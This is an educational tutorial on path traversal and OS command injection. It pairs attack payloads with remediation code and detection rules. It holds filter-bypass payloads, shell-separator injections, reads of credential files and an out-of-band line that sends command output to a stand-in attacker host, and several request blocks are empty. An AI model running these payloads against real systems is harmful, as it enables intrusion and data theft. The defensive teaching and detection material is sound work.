## The Big Picture: Breaching the Host Boundary

In secure web application architecture, the application layer should serve as an impenetrable quarantine zone. The web application interacts with end users over HTTP/HTTPS, while internal operating system resources—such as the underlying filesystem and shell interpreters—remain strictly isolated.

**Path Traversal** and **OS Command Injection** represent critical failures of this isolation boundary:
- **Path Traversal** abuses file-handling logic to escape the designated web directory and access the raw host filesystem.
- **OS Command Injection** abuses process execution logic to escape the application context and execute arbitrary system shell commands.

```text
+-------------------------------------------------------------------------------+
|                               UNTRUSTED USERS (Internet)                       |
+-------------------------------------------------------------------------------+
                                        |
                             HTTP / HTTPS Requests
                                        v
+===============================================================================+
|                           WEB APPLICATION BOUNDARY                            |
|                                                                               |
|   Client Input: ?file=...               Client Input: ?host=...               |
|            |                                       |                          |
|   [ File System API ]                    [ Command Execution API ]            |
+===============================================================================+
             | (Flaw: Unsanitized Path)              | (Flaw: Unsanitized Shell Input)
             v                                       v
+-----------------------------+         +---------------------------------------+
|    HOST OPERATING SYSTEM    |         |        HOST OPERATING SYSTEM          |
|         FILESYSTEM          |         |           COMMAND SHELL               |
|                             |         |                                       |
| Reads: /etc/passwd          |         | Executes: /bin/sh -c "ping -c 1 ; id" |
| Reads: /etc/shadow          |         | Spawns: /bin/bash (Interactive Shell) |
| Impact: Arbitrary File Read |         | Impact: Remote Code Execution (RCE)   |
+-----------------------------+         +---------------------------------------+
```

## Core Comparison: Path Traversal vs. OS Command Injection

| Dimension | Path Traversal (Directory Traversal) | OS Command Injection |
| :--- | :--- | :--- |
| **Target Subsystem** | Operating system filesystem APIs (`open`, `readfile`, `fs.readFile`) | System shell interpreters (`/bin/sh`, `bash`, `cmd.exe`, `powershell.exe`) |
| **Root Cause** | Concatenating untrusted input into filesystem path strings without directory canonicalization or boundary enforcement | Concatenating untrusted input directly into a shell command line string passed to a shell interpreter |
| **Attacker Objective**| Escape the web root directory to read (or write) arbitrary files | Escape the intended command parameter to execute arbitrary operating system commands |
| **Primary Impact** | **Confidentiality loss**: Exposure of passwords, configuration keys, database credentials, and source code. (Can escalate to RCE if write access or log poisoning is achieved) | **Complete system compromise**: Full Remote Code Execution (**RCE**), persistence, lateral movement, data exfiltration |
| **Typical CVSS Range**| 7.5 (High) to 8.6 (High) | 9.8 (Critical) |
| **Key Indicators** | Parameters: `?filename=`, `?path=`, `?page=`, `?doc=`, `?file=` | Parameters: `?ip=`, `?host=`, `?email=`, `?id=`, `?format=`, `?printer=` |
| **Remediation Strategy**| Strict allowlists, path normalization + prefix checking, storing files by database IDs | Avoid invoking shells; use parameterized execution APIs (`execFile`, `subprocess.run(shell=False)`) |

## 1. Path Traversal (Arbitrary File Read)

### How Filesystem Paths Work Under the Hood
Operating systems organize files into a hierarchical directory tree. To traverse this tree, operating systems recognize two special relative directory indicators:
- `.` (Current Directory): Represents the current working location.
- `..` (Parent Directory): Navigates one level up in the directory hierarchy.

When a developer builds a feature that dynamically serves files (such as product images, user invoices, or templated pages), they often store assets in a dedicated folder:
```text
/var/www/html/public/images/
```
If the backend code naively appends user input to this folder path without validation, an attacker can supply sequences of `../` to climb out of the folder and reach the root filesystem `/`.

### Directory Tree Escape Mechanics
```text
  / (Filesystem Root)
  |-- etc/
  |   |-- passwd  <-------------------------------------------+ (TARGET REACHED)
  |   +-- shadow                                              |
  |-- home/                                                   |
  +-- var/                                                    |
      +-- www/                                                |
          +-- html/                                           |
              +-- images/  <-- Intended Jail / Web Root       |
                    |                                         |
                    +-- Step 1: ../  (Moves up to /html/)     |
                    +-- Step 2: ../  (Moves up to /www/)      |
                    +-- Step 3: ../  (Moves up to /var/)      |
                    +-- Step 4: ../  (Moves up to /)          |
                    +-- Step 5: etc/passwd  ------------------+
```

### Vulnerable Code Anatomy
Consider this vulnerable PHP implementation:
```php
<?php
// Vulnerable snippet: fetching images dynamically
$image = $_GET['filename'];
$filepath = "/var/www/html/images/" . $image;

// Directly reads and streams the file to the browser
if (file_exists($filepath)) {
    header('Content-Type: image/jpeg');
    readfile($filepath);
}
?>
```
**Why this breaks:**
If a user requests `filename=avatar.jpg`, the path resolves to `/var/www/html/images/avatar.jpg`.
If an attacker sends `filename=../../../../etc/passwd`, the operating system resolves:
```text
/var/www/html/images/../../../../etc/passwd  ===>  /etc/passwd
```
The application dutifully opens `/etc/passwd` and streams it back to the client.

### Realistic Burp Suite Request & Response
In an authorized assessment, this attack is observed and tested in Burp Suite:

**Raw HTTP Request:**
```http

```

**Server HTTP Response:**
```http

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### High-Value Target Files by Operating System
When confirming arbitrary file reads during authorized assessments, specific operating system configuration files verify impact:

| Operating System | File Path | Information Disclosed |
| :--- | :--- | :--- |
| **Linux / Unix** | `/etc/passwd` | System users, UIDs, default shells, home directories |
| **Linux / Unix** | `/etc/shadow` | Password hashes (requires root privileges) |
| **Linux / Unix** | `/proc/self/environ` | Environment variables, often revealing API tokens and secret keys |

| **Windows** | `C:\Windows\win.ini` | Windows system settings (classic verification target) |
| **Windows** | `C:\Windows\System32\drivers\etc\hosts` | Static hostname mappings and internal IP routing |
| **Windows** | `C:\inetpub\wwwroot\web.config` | IIS configuration, database connection strings, application secrets |

## 2. Path Traversal Evasion & Filter Bypass Mechanics

Simple filters often fail because developers implement simplistic string stripping rather than proper path canonicalization.

### Evasion Matrix

| Filter Type | Developer's Naive Logic | Bypass Technique | Example Payload | Why the Bypass Works |
| :--- | :--- | :--- | :--- | :--- |
| **Non-Recursive Strip** | Replaces `"../"` with `""` once | **Nested Traversal** | `....//....//etc/passwd` | When `../` is stripped out, the remaining characters collapse together to recreate `../`. |
| **Absolute Path Block** | Checks if input starts with `../` | **Absolute Path / Direct Root** | `/etc/passwd` | If the application allows absolute paths directly, `../` is not even required. |
| **Path Prefix Requirement** | Ensures input starts with `/var/www/images/` | **Prefix Preservation + Traversal** | `/var/www/images/../../../../etc/passwd` | Fulfills the "starts with" check while still traversing out of the directory. |
| **Extension Enforcement** | Verifies filename ends in `.png` or `.jpg` | **Null Byte Injection (`%00`)** *(Legacy)* | `../../etc/passwd%00.png` | The high-level language sees the `.png` extension, but C-based system libraries truncate at the null byte. |
| **WAF Signature Detection**| Inspects query string for `../` | **Double URL Encoding** | `%252e%252e%252f` | Decoded once by WAF/Proxy into `%2e%2e%2f`, then decoded again by the application into `../`. |
| **Windows Separator Bias**| Blocks forward slashes `/` | **Backslash Traversal** | `..\..\..\..\windows\win.ini` | Windows accepts backslashes (`\`) and mixed slashes (`..\../`) as valid path separators. |

### Deep-Dive: Nested Traversal Collapse Mechanics
When developers attempt a quick fix like:
```python
# Flawed sanitization: non-recursive replacement
clean_path = user_input.replace("../", "")
```
The filter performs a single pass over the string. Notice what happens to `....//`:
```text
Input String:        . . . . / / e t c / p a s s w d
Target Match:          [ . . / ]
Stripped Result:     . .     /   e t c / p a s s w d
Collapsed String:    . .     /   etc/passwd  ===>  ../etc/passwd !
```

### Deep-Dive: Double URL Encoding Architecture
Web architectures often consist of multiple tiers: a Web Application Firewall (or Reverse Proxy) in front, and an Application Server behind it.

```text
[ Attacker ]
     |
     | Sends: %252e%252e%252f
     v
+=============================================================================+
|                      WAF / REVERSE PROXY LAYER                              |
|                                                                             |
|  1. Decodes outer layer: %25  ---> '%'                                      |
|  2. Resulting payload:  %2e%2e%2f                                           |
|  3. Inspects for '../': NO MATCH FOUND (String appears to be safe hex)      |
|  4. Forwards request upstream to Application Server                         |
+=============================================================================+
                                     |
                                     v
+=============================================================================+
|                         APPLICATION SERVER LAYER                            |
|                                                                             |
|  1. Automatically decodes URI parameters before handing to controller code  |
|  2. Decodes: %2e%2e%2f  ---> '../'                                          |
|  3. Passes raw '../' into filesystem API: open('/images/' + '../etc/passwd')|
|  4. VULNERABILITY EXPLOITED!                                                |
+=============================================================================+
```

### Deep-Dive: Null Byte Injection (`%00`)
In languages like PHP (versions prior to 5.3.4), strings are managed with internal lengths, but underlying filesystem calls rely on standard C libraries:
```c
FILE *fopen(const char *filename, const char *mode);
```
In C, strings are null-terminated (`\0`). When the string `"/var/www/images/../../etc/passwd\0.png"` is passed to `fopen()`, the C runtime encounters `\0` (ASCII 0x00) and treats it as the absolute end of the filename. Everything after the null byte is ignored by the kernel.

## 3. OS Command Injection: Flaws at the Shell Layer

### Why Command Injection Happens
Applications often require utility operations: pinging an IP address to verify connectivity, converting image formats via `convert` (ImageMagick), or querying a database script.

Instead of using direct programming libraries or system APIs, developers sometimes take a shortcut: they format a string and pass it to a system shell command execution function:
- **PHP:** `exec()`, `shell_exec()`, `system()`, `passthru()`, `popen()`
- **Python:** `os.system()`, `os.popen()`, `subprocess.Popen(..., shell=True)`
- **Node.js:** `child_process.exec()`
- **C/C++:** `system()`

When a shell like `/bin/sh` or `cmd.exe` receives a command line, it does not treat the input as a single command and monolithic arguments. It **parses and interprets metacharacters** (`|`, `;`, `&`, `$()`), allowing an attacker to inject entirely new commands.

### Shell Execution Architecture & Process Spawning
```text
Attacker Input: storeId=1 | whoami
                       |
                       v
+=============================================================================+
|                      VULNERABLE WEB BACKEND PROCESS                         |
|                                                                             |
| Executes: system("check_stock.sh " . $_POST['storeId']);                    |
+=============================================================================+
                               |
                   Spawns Shell via fork()/exec()
                               v
+=============================================================================+
|                        SYSTEM SHELL (/bin/sh -c)                            |
|                                                                             |
| Command String: check_stock.sh 1 | whoami                                   |
|                                                                             |
| 1. Evaluates separator: '|' (Pipe)                                          |
| 2. Forks Child Process 1: check_stock.sh 1                                  |
| 3. Forks Child Process 2: whoami                                            |
| 4. Redirects stdout of Child 1 to stdin of Child 2                          |
+=============================================================================+
                               |
                               +---> [ whoami executes: returns "www-data" ]
```

### Command Separators & Control Operators Reference

| Operator | Platform | Execution Behavior | Example Injected String | Resulting Execution |
| :--- | :--- | :--- | :--- | :--- |
| `;` | Unix / Linux | **Sequential**: Executes Command 2 after Command 1 finishes, regardless of success or failure. | `127.0.0.1; whoami` | Runs `ping 127.0.0.1`, then runs `whoami`. |
| `&` | Unix / Windows | **Background (Asynchronous)**: Runs Command 1 in background, immediately starts Command 2. | `127.0.0.1 & whoami` | Command 1 runs in background, Command 2 runs concurrently. |
| `&&` | Unix / Windows | **Logical AND**: Executes Command 2 *only* if Command 1 returns exit status `0` (success). | `127.0.0.1 && whoami` | If ping succeeds, `whoami` executes. |
| `\|` | Unix / Windows | **Pipe**: Routes standard output (stdout) of Command 1 into standard input (stdin) of Command 2. | `127.0.0.1 \| whoami` | Shell runs both; `whoami` ignores stdin and outputs current username. |
| `\|\|` | Unix / Windows | **Logical OR**: Executes Command 2 *only* if Command 1 returns non-zero exit status (fails). | `bad_input \|\| whoami`| If first command fails, `whoami` executes. |
| `` `cmd` `` | Unix / Linux | **Inline Command Substitution**: Executes inner command and substitutes its output into the outer command. | `echo `whoami`` | Replaces backtick block with result of `whoami`. |
| `$()` | Unix / Linux | **Modern Subshell Substitution**: Evaluates expression in a nested subshell. | `$(whoami)` | Replaces `$()` block with output of `whoami`. |
| `0x0a` / `\n` | Unix / Linux | **Newline Character**: Acts as Enter key in shell, initiating a second command on a new line. | `id%0awhoami` | Useful when space or punctuation characters are stripped by filters. |

## 4. In-Band vs. Blind Command Injection

Command injection scenarios differ based on whether the command's output is visible in the HTTP response.

### Comparison of Injection Types

| Type | Output Reflected in HTTP Response? | Detection Technique | Verification & Exploitation Method |
| :--- | :---: | :--- | :--- |
| **In-Band (Result-Based)** | 🔴 **YES** | Immediate output printed in response body | Run simple commands like `whoami`, `id`, `ip a`. Output displays directly on page. |
| **Blind (Time-Based)** | 🟢 **NO** | Injected time delays (latency difference) | Inject delays: `\| sleep 10` or `& ping -c 10 127.0.0.1 &`. If response latency increases by 10s, injection exists. |
| **Blind (Out-of-Band / OAST)**| 🟢 **NO** | Network callbacks to an attacker-controlled listener | Force external DNS or HTTP requests: `\| curl http://attacker-server.com/$(whoami)` or `nslookup $(whoami).burpcollaborator.net`. |
| **Blind (File Redirection)** | 🟢 **NO** | Write output to accessible web folder | Redirect stdout to public web root: `\| id > /var/www/html/static/whoami.txt`, then retrieve file via browser. |

### Practical Lab Walkthrough: In-Band Command Injection
Consider an authorized lab featuring a stock inquiry feature:

**HTTP Request (Burp Repeater):**

## 5. Lab Methodology & Structured Investigation

Applying a structured, scientific approach prevents erratic testing and produces reliable results during authorized assessments.

```text
[ FACT ]           Endpoint takes an input parameter and interacts with system utilities.
   |
   v
[ OBSERVATION ]    Normal baseline response: submitting storeId=1 returns "50 in stock" in 80ms.
   |
   v
[ HYPOTHESIS ]     The backend might concatenate the parameter into a shell script or filesystem query.
   |
   v
[ TEST ]           Inject a safe time-delay payload: storeId=1 | sleep 10
   |
   v
[ RESULT ]         The HTTP response returns after exactly 10,082 ms.
   |
   v
[ CONCLUSION ]     Blind OS Command Injection confirmed. The input is being evaluated by a system shell.
```

### Step-by-Step Diagnostic Workflow
1. **Establish Baseline:** Capture legitimate requests in **Burp Suite Proxy**, route them to **Repeater**, and record baseline status codes, body lengths, and round-trip response times.
2. **Surface Identification:** Locate parameters that imply file fetching (`file`, `img`, `doc`) or system operations (`ping`, `lookup`, `status`, `daemon`).
3. **Safe Probe Injection:**
   - For Path Traversal: Request `../../../../etc/passwd` or `..\..\..\..\windows\win.ini`.
   - For Command Injection: Start with a benign separator and identifier like `| whoami` or a deterministic delay like `|| sleep 5`.
4. **Interpreting Results:**
   - *HTTP 500 Internal Server Error:* Often indicates syntax errors in the backend shell command, confirming metacharacters are affecting execution.
   - *Empty response or stripped payload:* Suggests an input filter or sanitization routine is modifying the input. Move systematically through the evasion matrix (nested traversal, double URL encoding, alternate separators).

## 6. Secure Coding & Remediation

Both vulnerabilities are completely preventable by adhering to strict input boundaries and selecting safe execution APIs.

### Path Traversal Defense: Canonicalization & Boundary Checking

#### Vulnerable Implementation (Python):
```python
# VULNERABLE: Direct path concatenation
def get_user_file(filename):
    file_path = "/var/www/data/" + filename
    with open(file_path, "r") as f:
        return f.read()
```

#### Secure Implementation (Python):
```python
import os
from pathlib import Path

BASE_DIR = Path("/var/www/data/").resolve()

def get_user_file_secure(filename):
    # 1. Resolve and canonicalize the absolute path (evaluates all '..' sequences)
    target_path = (BASE_DIR / filename).resolve()

    # 2. Enforce directory boundary check
    if not target_path.is_relative_to(BASE_DIR):
        raise PermissionError("Access Denied: Path Traversal Attempt Detected.")

    # 3. Ensure the file exists and is a regular file
    if not target_path.is_file():
        raise FileNotFoundError("Requested file does not exist.")

    return target_path.read_text()
```

---

### OS Command Injection Defense: Parameterized Execution Without a Shell

#### Vulnerable Implementation (Python):
```python
import os

# VULNERABLE: Passing concatenated user input into shell=True
def ping_host(user_ip):
    os.system("ping -c 1 " + user_ip)
```

#### Secure Implementation (Python):
```python
import subprocess
import ipaddress

def ping_host_secure(user_ip):
    # 1. Strict Input Validation (Allowlisting / Type Checking)
    try:
        validated_ip = str(ipaddress.ip_address(user_ip))
    except ValueError:
        raise ValueError("Invalid IP address format.")

    # 2. Parameterized Execution (shell=False)
    # The OS treats arguments as literal data, completely neutralizing metacharacters like ';', '|', '&&'
    result = subprocess.run(
        ["/bin/ping", "-c", "1", validated_ip],
        shell=False,
        capture_output=True,
        text=True,
        timeout=5
    )
    return result.stdout
```

## 7. Blue Team & SOC Detection Engineering

A robust defense combines perimeter filtering (WAF) with endpoint telemetry (EDR and SIEM).

### Perimeter Level: WAF Signatures
Web Application Firewalls inspect incoming HTTP traffic for signature patterns:
- Path Traversal patterns: `\.\./`, `\.\.\\`, `%2e%2e`, `%252e%252e`, `%00`
- Command Injection patterns: `[;&|`$]`, `\bwhoami\b`, `\bcat\s+/etc/passwd\b`, `\bcmd\.exe\b`, `\bpowershell\.exe\b`

### Endpoint Level: EDR Process-Tree Anomaly Detection
The most definitive indicator of OS Command Injection is **parent-child process lineage anomalies**. Under normal operation, a web server process (`nginx`, `apache2`, `httpd`, `w3wp.exe`) should only serve network traffic and invoke backend runtime workers. It should **never directly spawn interactive command interpreters**.

```text
NORMAL PROCESS LINEAGE:
[ systemd ] ---> [ apache2 (PID 1102) ] ---> [ php-fpm (PID 1140) ]

ANOMALOUS PROCESS LINEAGE (CRITICAL ALERT):
[ systemd ] ---> [ apache2 (PID 1102) ] 
                       |
                       +---> [ /bin/sh (PID 4501) ]   <--- SUSPICIOUS CHILD PROCESS!
                                   |
                                   +---> [ whoami (PID 4502) ]
                                   +---> [ /bin/bash -i (PID 4503) ] (Reverse Shell)
```

### Detection Engineering Rules

**Example Sigma Rule Concept (Process Creation):**
```yaml
title: Web Server Spawning Command Interpreter
status: production
description: Detects web server software spawning shell processes, indicating possible OS Command Injection.
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        ParentImage|endswith:
            - '/apache2'
            - '/nginx'
            - '/httpd'
            - '/php-fpm'
        Image|endswith:
            - '/bin/sh'
            - '/bin/bash'
            - '/bin/dash'

            - '/usr/bin/id'
            - '/bin/nc'
    condition: selection
level: critical
```
